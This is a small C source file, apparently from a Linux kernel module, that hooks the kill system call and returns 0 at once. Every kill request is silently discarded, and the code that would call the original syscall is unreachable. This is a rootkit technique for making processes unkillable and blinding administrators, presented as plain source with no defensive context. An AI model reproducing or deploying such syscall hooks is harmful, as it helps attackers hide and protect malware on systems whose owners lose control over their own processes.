#include "../inc/hook.h"
#include "../inc/util.h"

#include <linux/module.h>

syscall_t *_kill = NULL;

asmlinkage int64_t h_kill(const struct pt_regs *r) {
  return 0;

  if (_kill == NULL)
    _kill = hooks_find_orig(__NR_kill);

  return _kill(r);
}
